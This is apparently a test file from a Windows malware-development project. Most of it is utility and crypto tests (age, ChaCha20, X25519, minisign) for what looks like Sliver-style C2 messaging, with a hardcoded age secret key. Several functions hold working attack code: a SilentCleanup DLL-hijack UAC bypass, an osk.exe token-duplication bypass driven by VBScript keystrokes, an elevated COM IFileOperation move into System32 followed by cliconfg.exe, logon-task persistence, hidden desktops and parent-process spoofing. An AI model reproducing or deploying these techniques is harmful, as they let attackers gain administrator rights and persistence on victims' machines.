﻿#include "pch.h"

VOID Callback
(
	_In_ BSTR lpInput,
	_In_ LPVOID Arg
)
{
	LPWSTR lpDllPath = (LPWSTR)Arg;
	LPSTR szFolderName, szTemp;
	CHAR szTempPath[MAX_PATH];

	szFolderName = StrStrA(lpInput, "\tFileName = \"") + lstrlenA("\tFileName = \"");
	szTemp = StrChrA(szFolderName, '"');
	szTemp[0] = '\0';
	GetTempPathA(MAX_PATH, szTempPath);
	lstrcatA(szTempPath, "\\");
	lstrcatA(szTempPath, szFolderName);
	PrintFormatA("szTempPath: %s\n", szTempPath);
	//CopyFileWp(lpDllPath, szTempPath, FALSE);
}

VOID StartTaskThread(VOID)
{
	HANDLE hEvent = NULL;

	while (TRUE) {
		hEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, L"EventSink");
		if (hEvent != NULL) {
			break;
		}

		Sleep(2000);
	}

	if (!StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup")) {
		return;
	}
}

#ifdef _DEBUG
VOID test1(void) {
	HANDLE hThread = NULL;

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartTaskThread, NULL, 0, NULL);
	if (hThread == NULL) {
		return;
	}

	RegisterAsyncEvent(L"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Directory\" AND TargetInstance.Drive = \"C:\" AND TargetInstance.Path = \"\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\\" AND TargetInstance.FileName LIKE \"________-____-____-____-____________\"", Callback, L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
}

VOID test2
(
	_In_ LPWSTR lpDllPath
)
{
	PBYTE pOutput = NULL;
	DWORD dwSize = 0;
	LPSTR szFolderName, szTemp;
	CHAR szTempPath[MAX_PATH];

	if (!CreateProcessAndGetOutput(L"C:\\Users\\Admin\\Desktop\\Test.exe", &pOutput, &dwSize)) {
		return;
	}

	szFolderName = StrStrA(pOutput, "\tFileName = \"") + lstrlenA("\tFileName = \"");
	szTemp = StrChrA(szFolderName, '"');
	szTemp[0] = '\0';
	GetTempPathA(MAX_PATH, szTempPath);
	lstrcatA(szTempPath, "\\");
	lstrcatA(szTempPath, szFolderName);
	CopyFileWp(lpDllPath, szTempPath, FALSE);
}

BOOL IsGUIDStringW
(
	_In_ LPWSTR lpInput
)
{
	// 01234567-0123-0123-0123-0123456789ab
	DWORD dwLength = lstrlenW(lpInput);
	UINT32 i, j;
	WCHAR AllowedCharacters[] = { L'a', L'b', L'c', L'd', L'e', L'f', L'A', L'B', L'C', L'D', L'E', L'F' };
	BOOL bIsOk = FALSE;

	if (lpInput[8] != L'-' || lpInput[13] != L'-' || lpInput[18] != L'-' || lpInput[23] != L'-') {
		return FALSE;
	}

	lpInput[8] = L'0';
	lpInput[13] = L'0';
	lpInput[18] = L'0';
	lpInput[23] = L'0';
	for (i = 0; i < dwLength; i++) {
		for (j = 0; j < _countof(AllowedCharacters); j++) {
			if (lpInput[i] == AllowedCharacters[j] || (lpInput[i] >= L'0' && lpInput[i] <= '9')) {
				bIsOk = TRUE;
				break;
			}
		}

		if (!bIsOk) {
			return FALSE;
		}
	}

	lpInput[8] = L'-';
	lpInput[13] = L'-';
	lpInput[18] = L'-';
	lpInput[23] = L'-';
	return TRUE;
}

BOOL PrintFileName(
	_In_ HANDLE hDir,
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpParameters
)
{
	LPWSTR lpFileName = PathFindFileNameW(lpPath);
	LPWSTR lpDirName;
	LPWSTR lpOutput = (LPWSTR)lpParameters;

	if (StrCmpW(lpFileName, L"LogProvider.dll")) {
		return FALSE;
	}

	lpFileName[-1] = L'\0';
	lpDirName = PathFindFileNameW(lpPath);
	if (!IsGUIDStringW(lpDirName)) {
		return FALSE;
	}

	CloseHandle(hDir);
	StrCpyW(lpOutput, lpPath);
	return TRUE;
}

VOID test3
(
	_In_ LPWSTR lpMaliciousDll
)
{
	/*WCHAR wszLogProvider[MAX_PATH];
	DWORD dwResult;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	SecureZeroMemory(wszLogProvider, sizeof(wszLogProvider));
	WatchFileCreationEx(L"C:\\Users\\Admin\\AppData\\Local\\Temp", TRUE, PrintFileName, wszLogProvider);
	PrintFormatW(L"%s\n", wszLogProvider);
	if (!IsFolderExist(wszLogProvider)) {
		LogError(L"%s.%d: Folder is not exist\n", __FILE__, __LINE__);
		return;
	}

	StrCatW(wszLogProvider, L"\\LogProvider.dll");
	if (!IsFileExist(wszLogProvider)) {
		LogError(L"%s.%d: File is not exist\n", __FILE__, __LINE__);
		return;
	}

	if (!CopyFileWp(lpMaliciousDll, wszLogProvider, TRUE)) {
		LogError(L"%s.%d: Failed to copy dll\n", __FILE__, __LINE__);
		return;
	}

	PrintFormatW(L"dwResult = 0x%08x\n", dwResult);
	hFile = CreateFileW(wszLogProvider, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateFileW", GetLastError());
		return;
	}

	Sleep(1000000);*/
}

void test4(void) {
	PrintFormatA("%s\n", ConvertWcharToChar(L"Hello World"));
	PrintFormatW(L"%s\n", ConvertCharToWchar("Hello World"));
}

void test5(void) {
	
}

void test6(void) {

}

void test7(void) {
	CHAR szKey[] = { 231, 121, 89, 214, 23, 251, 49, 23, 236, 76, 192, 5, 20, 135, 151, 126, 176, 103, 181, 0, 131, 195, 5, 20, 64, 243, 54, 65, 45, 46, 151, 150 };
	CHAR szNonce[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
	PBYTE pCipherText = NULL;
	CHAR szPlainText[] = { 224, 233, 149, 125, 99, 245, 90, 7, 96, 115, 115, 148, 209, 93, 172, 122, 107, 122, 3, 27, 34, 63, 79, 48, 19, 49, 81, 114, 25, 182, 115, 60, 10, 32, 251, 113, 100, 7, 2, 43, 116, 89, 213, 134, 47, 155, 113, 206, 255, 156, 45, 214, 193, 173, 94, 231, 160, 3, 90, 47, 143, 78, 239, 13, 173, 21 };
	LPSTR lpOutput = NULL;
	DWORD cbCipherText = 0;

	Chacha20Poly1305Encrypt(szKey, szNonce, szPlainText, sizeof(szPlainText), NULL, 0, &pCipherText, &cbCipherText);
	lpOutput = ConvertToHexString(pCipherText, cbCipherText);
	PrintFormatA("%s\n", lpOutput);
	FREE(lpOutput);
	//Chacha20Poly1305Decrypt(szKey, szNonce, szCipherText, szPlainText, lstrlenA("test"));
}

void test8(void) {
	BYTE Buffer[] = { 152, 160, 197, 161, 181, 205, 97, 250, 161, 153 };
	LPSTR lpHexString = NULL;
	PBYTE pByteArray = NULL;
	lpHexString = ConvertToHexString(Buffer, _countof(Buffer));
	PrintFormatA("lpHexString = %s\n", lpHexString);
	pByteArray = FromHexString(lpHexString);
	for (DWORD i = 0; i < _countof(Buffer); i++) {
		if (Buffer[i] != pByteArray[i]) {
			PrintFormatA("Failed at %d\n", i);
			break;
		}
	}

	FREE(lpHexString);
	FREE(pByteArray);
}

void test9(void) {
	PBYTE pHashDigest = ComputeSHA256("Hello World", lstrlenA("Hello World"));
	LPSTR lpHexDigest = ConvertToHexString(pHashDigest, 32);
	PrintFormatA("Hex digest: %s\n", lpHexDigest);
	FREE(pHashDigest);
	FREE(lpHexDigest);
	return;
}

void test10(void) {
	LPSTR lpOutput = NULL;
	PBYTE HMac = GenerateHmacSHA256("Secret Key", lstrlenA("Secret Key"), "Hello World", lstrlenA("Hello World"));
	lpOutput = ConvertToHexString(HMac, 32);
	PrintFormatA("lpOutput: %s\n", lpOutput);
	FREE(HMac);
	return;
}

void test11(void) {
	CHAR szInput[] = "age1c6j0mssdmznty6ahkckmhwszhd3lquupd5rqxnzlucma482yvspsengc59";
	PBYTE pOutput;
	DWORD cbOutput = 0;
	CHAR szHrp[0x20];
	LPSTR lpOutput = NULL;

	RtlSecureZeroMemory(szHrp, sizeof(szHrp));
	Bech32Decode(szHrp, &pOutput, &cbOutput, szInput);
	lpOutput = ConvertToHexString(pOutput, cbOutput);
	PrintFormatA("szOutput: %s\n", lpOutput);
	return;
}

void test12(void) {
	BYTE a[] = { 0x4c, 0x4a, 0x3a, 0x8a, 0xa4, 0xc, 0xa7, 0xe9, 0xc8, 0x50, 0xf9, 0x2e, 0x3c, 0x5b, 0xa3, 0x2, 0x21, 0xc0, 0x4a, 0x6a, 0xe3, 0x3e, 0xb6, 0xc0, 0x26, 0x5f, 0xb2, 0xb9, 0xc4, 0xf0, 0x92, 0xa7 };
	BYTE b[] = { 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
	BYTE c[0x20] = { 0 };
	ComputeX25519(c, a, b);
	LPSTR lpOutput = ConvertToHexString(c, sizeof(c));
	PrintFormatA("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
}

void test13(void) {
	CHAR szInfo[] = "hkdf-example";
	CHAR szKey[] = "input key";
	BYTE Salt[] = { 188, 49, 67, 71, 174, 231, 83, 62, 183, 47, 136, 245, 54, 178, 101, 135, 50, 72, 41, 97, 103, 184, 5, 86, 223, 122, 35, 123, 76, 235, 87, 30 };
	PBYTE pOutput = NULL;
	LPSTR lpOutput = NULL;

	pOutput = HKDFGenerate(Salt, sizeof(Salt), szKey, lstrlenA(szKey), NULL, 0, 41);
	lpOutput = ConvertToHexString(pOutput, 41);
	PrintFormatA("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
	FREE(pOutput);
	return;
}

void test14(void) {
	BYTE FileKey[] = { 0xca, 0x98, 0xb5, 0xff, 0x69, 0xc9, 0x5a, 0xb7, 0x19, 0x67, 0xc6, 0xe4, 0x33, 0x5c, 0x68, 0xf5 };
	BYTE TheirPubKey[] = { 0xdd, 0x55, 0x44, 0xfc, 0xae, 0xae, 0x32, 0xea, 0xd, 0x6, 0x2e, 0x7b, 0x13, 0x46, 0xca, 0x53, 0xb5, 0xde, 0xc, 0x53, 0x2e, 0x8c, 0x6, 0xbd, 0xbc, 0x58, 0x9e, 0x6e, 0xa9, 0xa7, 0x8d, 0x61 };
	PSTANZA pResult = NULL;
	LPSTR lpOutput = NULL;

	pResult = AgeRecipientWrap(FileKey, sizeof(FileKey), TheirPubKey);
	lpOutput = ConvertToHexString(pResult->pBody, 32);
	PrintFormatA("lpOutput: %s\n", lpOutput);
	FREE(lpOutput);
	FREE(pResult);
}

void test15(void) {
	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
	BYTE PlainText[] = { 10, 32, 160, 8, 226, 25, 133, 57, 45, 26, 159, 50, 208, 44, 0, 207, 249, 243, 54, 158, 66, 199, 50, 184, 3, 16, 128, 176, 16, 14, 190, 185, 202, 227 };
	DWORD cbOutput = 0;
	PBYTE pCipherText = NULL;

	pCipherText = AgeEncrypt(szRecipientPubKey, PlainText, sizeof(PlainText), &cbOutput);
	HexDump(pCipherText, 266);
	FREE(pCipherText);
}

void test16(void) {
	MessageBoxW(NULL, L"Hello World", L"Title", MB_OK);
}

void test17(void) {
	CHAR wszInput[] = "As before, a side effect of this design is that when a function returns the same value as one of its callees, it needs to read the return value from the callee from its own activation record, then place it back onto the stack at a return value in its caller’s activation record. Tail call optimizations (TCO) thus remain impossible.";
	LPSTR lpOutput = NULL;

	lpOutput = StrReplaceA(wszInput, "a", "bbbbbbbbb", TRUE, 0);
	PrintFormatA("%s\n", wszInput);
	PrintFormatA("-----------------------------\n");
	PrintFormatA("%s\n", lpOutput);
	FREE(lpOutput);
}

void test18(void) {
	LPSTR lpOutput = GenGUIDStrA();
	PrintFormatA("%s\n", lpOutput);
	FREE(lpOutput);
}

void test19(void) {
	/*WTStartPersistence("C:\\Users\\Admin\\source\\repos\\MalDev\\x64\\Debug\\Test.exe");
	return;*/
}

void test20(void) {
	LPWSTR* pArray = NULL;
	DWORD dwSize = 0;

	pArray = ListFileWithFilter(L"C:\\Users\\Admin\\Desktop\\Apps", L"*T*", 0, &dwSize);
	if (pArray != NULL && dwSize > 0) {
		for (DWORD i = 0; i < dwSize; i++) {
			PrintFormatW(L"%d: %s\n", pArray[i]);
		}
	}
}

void test21
(
	_In_ LPSTR lpCommandLine
)
{
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	DWORD dwPid = 0;
	SECURITY_ATTRIBUTES sa;
	HANDLE hDuplicatedToken = NULL;
	TOKEN_MANDATORY_LABEL TokenInfo;
	PSID pSid = NULL;
	LPWSTR lpTempPath = NULL;
	CHAR szVbsContent[] = "Set troll = WScript.CreateObject(\"WScript.Shell\")\ntroll.Run \"taskmgr.exe\"\nWScript.Sleep 250\ntroll.SendKeys \"%\"\nWScript.Sleep 250\ntroll.SendKeys \"{F}\"\nWScript.Sleep 250\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 250\ntroll.SendKeys \"^v\"\ntroll.SendKeys \"{TAB}\"\nWScript.Sleep 250\ntroll.SendKeys \"{+}\"\nWScript.Sleep 250\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 250\ntroll.AppActivate(\"Task Manager\")\ntroll.SendKeys \"%{f4}\"";
	LPWSTR lpCscriptCommandLine = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	HGLOBAL hMem = NULL;
	LPWSTR lpGlobalMem = NULL;
	LPWSTR lpTemp = NULL;

	SHELLEXECUTEINFOW sei = { sizeof(sei) };
	sei.lpVerb = L"open";
	sei.lpFile = L"osk.exe";
	sei.nShow = SW_SHOW;
	sei.fMask |= SEE_MASK_NOCLOSEPROCESS;

	if (!ShellExecuteExW(&sei)) {
		LOG_ERROR("ShellExecuteExW", GetLastError());
		goto CLEANUP;
	}

	dwPid = GetProcessId(sei.hProcess);
	CloseHandle(sei.hProcess);
	PrintFormatW(L"dwPid = %d\n", dwPid);
	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, TRUE, dwPid);
	if (hProc == NULL) {
		LOG_ERROR("OpenProcess", GetLastError());
		goto CLEANUP;
	}

	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
		LOG_ERROR("OpenProcessToken", GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&sa, sizeof(sa));
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
		LOG_ERROR("DuplicateTokenEx", GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&TokenInfo, sizeof(TokenInfo));
	ConvertStringSidToSidW(SDDL_ML_MEDIUM, &pSid);
	TokenInfo.Label.Sid = pSid;
	if (!SetTokenInformation(hDuplicatedToken, TokenIntegrityLevel, &TokenInfo, sizeof(TokenInfo))) {
		LOG_ERROR("SetTokenInformation", GetLastError());
		goto CLEANUP;
	}

	if (!WriteToTempPath(szVbsContent, lstrlenA(szVbsContent), L"vbs", &lpTempPath)) {
		goto CLEANUP;
	}

	hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlenA(lpCommandLine) + 1) * sizeof(WCHAR));
	if (hMem == NULL) {
		LOG_ERROR("GlobalAlloc", GetLastError());
		goto CLEANUP;
	}

	lpGlobalMem = GlobalLock(hMem);
	lpTemp = ConvertCharToWchar(lpCommandLine);
	lstrcpyW(lpGlobalMem, lpTemp);
	lpGlobalMem[lstrlenW(lpGlobalMem)] = L'\0';
	GlobalUnlock(hMem);
	if (!OpenClipboard(NULL)) {
		LOG_ERROR("OpenClipboard", GetLastError());
		goto CLEANUP;
	}

	if (!EmptyClipboard()) {
		LOG_ERROR("EmptyClipboard", GetLastError());
		goto CLEANUP;
	}

	if (!SetClipboardData(CF_UNICODETEXT, hMem)) {
		LOG_ERROR("SetClipboardData", GetLastError());
		goto CLEANUP;
	}

	CloseClipboard();
	lpCscriptCommandLine = ALLOC((lstrlenW(lpTempPath) + 21) * sizeof(WCHAR));
	lstrcpyW(lpCscriptCommandLine, L"cscript.exe /NOLOGO ");
	lstrcatW(lpCscriptCommandLine, lpTempPath);
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessAsUserW(hDuplicatedToken, NULL, lpCscriptCommandLine, &sa, &sa, FALSE, 0, NULL, NULL, &si, &pi)) {
		LOG_ERROR("CreateProcessAsUserW", GetLastError());
		goto CLEANUP;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	DeleteFileW(lpTempPath);
	TerminateProcess(hProc, 0);
CLEANUP:
	if (lpTemp != NULL) {
		FREE(lpTemp);
	}

	if (hMem != NULL) {
		GlobalFree(hMem);
	}

	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}
	return;
}

void test22(void) {
	for (DWORD i = 0; i < 1000; i++) {
		PrintFormatW(L"#%d: ", i);
		IsSystemLock();
		Sleep(1000);
	}
}

void test23(void) {
	BypassByOsk("cmd /C \"cd C:\\Users\\Admin\\Desktop && whoami /priv > a.txt\"");
}

void test24(void) {
	WCHAR wszCommandLine[] = L"D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\1Test.exe";
	CreateProcessWithDesktop(wszCommandLine, L"Hidden Desktop");
}

void test25(void) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.dwFlags |= STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	if (!CreateProcessW(L"C:\\Windows\\System32\\osk.exe", L"C:\\Windows\\System32\\osk.exe ", NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		LOG_ERROR("CreateProcessW", GetLastError());
	}

	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}
}

void test26(void) {
	SIZE_T cbList = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;

	InitializeProcThreadAttributeList(NULL, 8, 0, &cbList);
	HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, 27644);
	pAttrList = ALLOC(cbList);
	if (!InitializeProcThreadAttributeList(pAttrList, 8, 0, &cbList)) {
		LOG_ERROR("InitializeProcThreadAttributeList", GetLastError());
		return;
	}

	if (!UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL)) {
		LOG_ERROR("UpdateProcThreadAttribute", GetLastError());
		return;
	}
}

void test27(void) {
	LogError(L"Hello World");
}

void test28(void) {
	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\a.txt", L"C:\\Windows\\System32", FALSE);
}

void test29(void)
{
	BOOL                cond = FALSE;
	IFileOperation* FileOperation1 = NULL;
	IShellItem* isrc = NULL, * idst = NULL;
	BIND_OPTS3          bop;
	SHELLEXECUTEINFOW   shexec;
	HRESULT             r;

	do {

		r = CoInitialize(NULL);
		if (r != S_OK)
			break;

		RtlSecureZeroMemory(&bop, sizeof(bop));
		RtlSecureZeroMemory(&shexec, sizeof(shexec));

		r = CoCreateInstance(&CLSID_FileOperation, NULL,
			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

		if (r != S_OK) {
			break;
		}

		if (FileOperation1 != NULL) {
			FileOperation1->lpVtbl->Release(FileOperation1);
		}

		bop.cbStruct = sizeof(bop);
		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER/* | CLSCTX_INPROC_HANDLER*/;
		r = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", (BIND_OPTS*)&bop, &IID_IFileOperation, &FileOperation1);
		if (r != S_OK) {
			break;
		}
		if (FileOperation1 == NULL) {
			r = E_FAIL;
			break;
		}

		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);

		r = SHCreateItemFromParsingName(L"C:\\temp\\ntwdblib.dll",
			NULL, &IID_IShellItem, &isrc);

		if (r != S_OK) {
			break;
		}
		r = SHCreateItemFromParsingName(L"C:\\windows\\system32\\", NULL, &IID_IShellItem, &idst);
		if (r != S_OK) {
			break;
		}

		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
		if (r != S_OK) {
			break;
		}
		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
		if (r != S_OK) {
			break;
		}

		idst->lpVtbl->Release(idst);
		idst = NULL;
		isrc->lpVtbl->Release(isrc);
		isrc = NULL;

		shexec.cbSize = sizeof(shexec);
		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
		shexec.nShow = SW_SHOW;

		shexec.lpFile = L"C:\\windows\\system32\\cliconfg.exe";
		shexec.lpParameters = NULL;
		shexec.lpDirectory = L"C:\\windows\\system32\\";
		if (ShellExecuteExW(&shexec)) {
			if (shexec.hProcess != NULL) {
				WaitForSingleObject(shexec.hProcess, INFINITE);
				CloseHandle(shexec.hProcess);
			}
		}

	} while (cond);

	if (FileOperation1 != NULL) {
		FileOperation1->lpVtbl->Release(FileOperation1);
	}
	if (isrc != NULL) {
		isrc->lpVtbl->Release(isrc);
	}
	if (idst != NULL) {
		idst->lpVtbl->Release(idst);
	}
	CoUninitialize();
}

void test30(void) {
	PBYTE pBuffer = NULL;
	DWORD cbBuffer = 0;

	pBuffer = ReadFromFile(L"C:\\Windows\\System32\\cmd.exe", &cbBuffer);
	IeAddOnInstallMethod(pBuffer, cbBuffer);
	FREE(pBuffer);
}

void test31(void) {
	LPWSTR List[] = { L"Zalo.exe", L"SystemInformer.exe", L"chrome.exe", L"steam.exe", L"wallpaper32.exe", L"SnippingTool.exe" };
	BOOL Result = FALSE;

	Result = AreProcessesRunning(List, _countof(List), 0);
	PrintFormatW(L"Result = %d\n", Result);
}

void test32(void) {
	CreateAtLogonTask(L"Calc", L"\\", L"C:\\Windows\\System32\\calc.exe");
}

void test33(void) {
	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\ida.hexli", L"C:\\Windows\\System32", FALSE);
}

void test34(void) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void test35(void) {
	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
	BYTE PrivateKey[] = "AGE-SECRET-KEY-1H8ACTYAEN9TN8XM4FNJR0KLAFR0FDMAQ8NTJTLKU3JZA6TWR7QSQ206NN8";
	BYTE PublicKey[] = "age1e983tu02e4ht5m5s3kdc8gcddpqs8jvkdft4644e80ngnh3rrvvqw06pk2";
	PBYTE pCipherText = NULL;
	DWORD cbCipherText = 0;
	BYTE PlainText[] = { 10, 32, 207, 232, 22, 198, 58, 9, 197, 243, 173, 16, 93, 130, 177, 56, 205, 148, 33, 17, 156, 162, 199, 197, 246, 217, 49, 150, 20, 146, 123, 199, 136, 248 };

	pCipherText = AgeKeyExToServer(szRecipientPubKey, PrivateKey, PublicKey, PlainText, _countof(PlainText), &cbCipherText);
	HexDump(pCipherText, cbCipherText);
	FREE(pCipherText);
}

void test36(void) {
	/*CHAR szEncodedStr[] = "SGVsbG8gV29ybGQ=";
	DWORD cbOutput = 0;
	LPSTR lpOutput = NULL;

	lpOutput = Base64Decode(szEncodedStr, &cbOutput);
	PrintFormatA("lpOutput: %s, cbOutput: %d\n", lpOutput, cbOutput);
	FREE(lpOutput);*/
}

void test37(void) {
	BYTE CipherText[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 144, 144, 76, 102, 126, 178, 220, 49, 255, 50, 134, 6, 178, 19, 111, 101, 235, 109, 142, 220, 80, 109, 83, 183, 239, 211, 11, 38, 88, 81, 137, 198, 77, 175, 46, 180, 204, 247, 145, 70, 196, 223, 12, 79, 33, 202, 34, 241, 49, 43, 148, 167, 117, 64, 16, 81, 209, 90, 0, 122, 22, 15, 152, 4, 231, 162, 192, 64, 243, 108, 238, 189, 23, 193, 98, 223, 142, 236, 212, 44, 235, 226, 231, 187, 60, 154, 189, 50, 249, 188, 89, 56, 43, 67, 65, 253, 119, 243, 213, 25, 193, 238, 178, 173, 183, 205, 29, 36, 124, 149, 53, 236, 5, 153, 56, 160, 183, 249, 239, 241, 147, 240, 71, 202, 142, 114, 243, 109, 6, 173, 198, 119, 218, 123, 240, 242, 190, 91, 186, 14, 18, 149, 249, 58, 12, 16, 119, 211 };
	LPSTR lpOutput = NULL;

	//lpOutput = SliverBase64Encode(CipherText, _countof(CipherText));
	PrintFormatA("%s\n", lpOutput);
	FREE(lpOutput);
}

void test38(void) {
	/*CHAR szEncoded[] = "osqOP-fq_c2a3+bnqduYKLNOZPhd0Jfqw8tJw-VxrdRqLYZqb9u-r-FdqvWMLjPS4rwcSNOmfxG3WqcJDhyRn00oQ_GazB-mEaqFGK0aW8PM7oA0-LYlVknKUYiFMP9v7qi+754ThQk0ZtAPRoF0VJhLLWQy6e9_kzN5Eq31LZF7WumNoWIlx7kL0ISdyXHVWmhYsVGlcHt+l1NnyXj";
	DWORD cbOutput = 0;
	PBYTE pOutput = NULL;

	pOutput = SliverBase64Decode(szEncoded, &cbOutput);
	HexDump(pOutput, cbOutput);
	FREE(pOutput);*/
}

void test39(void) {
	/*BYTE Msg[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3, 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
	CHAR szServerMinisignPublicKey[] = "untrusted comment: minisign public key: 8BC040541382CDF1\nRWTxzYITVEDAi0WSY4oCDg/kTkSnjDCcsPuXF4xm/kyh434uy6PHFiUq";
	SessionDecrypt(NULL, Msg, _countof(Msg), szServerMinisignPublicKey, NULL);;*/
}

void test40(void) {
	CHAR wszInput[] = "aaaaaaNewaaaa to ubuntu and servers. I just finished installing a new ubuntu server and added LAMP. I can assess the webpage that I am hosting by typing in the web browser the IP address of the server. what I would like to know is how to access the same web page locally on my network from another computer using a name instead of the IP address.aaa";
	LPSTR* pResult = NULL;
	DWORD cbResult = 0;
	DWORD i = 0;

	pResult = StrSplitNA(wszInput, "a", 0, &cbResult);
	PrintFormatA("cbResult = %d\n", cbResult);
	for (i = 0; i < cbResult; i++) {
		PrintFormatA("%s\n", pResult[i]);
	}
}

void test41(void) {
	CHAR szInpit[] = "untrusted comment: minisign public key: C974C3DEE0AE9DF4\nRWT0na7g3sN0yad3zBthDFTfPuEnuG+wDeLQesyaBb3nTCIVsBg+PXAv";
	PMINISIGN_PUB_KEY pResult = NULL;
	pResult = DecodeMinisignPublicKey(szInpit);
	HexDump(pResult, sizeof(MINISIGN_PUB_KEY));
	FREE(pResult);
}

void test42(void) {
	BYTE Data[] = "GeeksForGeeks";
	PBYTE pDigest = NULL;

	pDigest = Blake2B(Data, lstrlenA(Data), NULL, 0);
	HexDump(pDigest, 64);
	FREE(pDigest);
}

//#include "D:\\Temp\\ed25519\\src\\ed25519.h"
//#include "D:\\Temp\\ed25519\\src\\ge.h"
//#include "D:\\Temp\\ed25519\\src\\sc.h"
typedef int (WINAPI* ED25519_VERIFY)(PBYTE, PBYTE, SIZE_T, PBYTE);

void test43(void) {
	BYTE Msg[] = { 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
